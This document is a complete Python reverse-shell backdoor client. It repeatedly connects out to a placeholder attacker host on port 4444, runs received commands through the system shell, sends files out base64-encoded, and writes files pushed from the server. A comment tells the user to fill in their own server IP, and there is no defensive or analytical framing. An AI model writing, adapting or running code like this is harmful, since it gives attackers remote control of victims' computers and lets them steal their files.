import socket
import subprocess
import json
import os
import base64
import time

def reliable_send(data, sock):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def reliable_recv(sock):
    data = b""
    while True:
        try:
            data += sock.recv(1024)
            return json.loads(data.decode())
        except ValueError:
            continue

def execute_command(command):
    try:
        if command[:2] == "cd":
            os.chdir(command[3:])
            return "[+] Changed directory to " + os.getcwd()
        elif command[:8] == "download":
            path = command[9:].strip()
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        elif command[:6] == "upload":
            path = command[7:].strip()
            reliable_send("[READY]", sock)
            file_data = reliable_recv(sock)
            with open(path, "wb") as file:
                file.write(base64.b64decode(file_data))
            return "[+] Upload successful."
        else:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
    except Exception as e:
        return f"[-] Error: {str(e)}"

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("ATTACKER_IP", 4444))  # Replace ATTACKER_IP with your server IP
            break
        except:
            time.sleep(5)  # Retry every 5 seconds if connection fails

    while True:
        command = reliable_recv(sock)
        if command == "exit":
            break
        result = execute_command(command)
        reliable_send(result, sock)

    sock.close()

if __name__ == "__main__":
    connect()
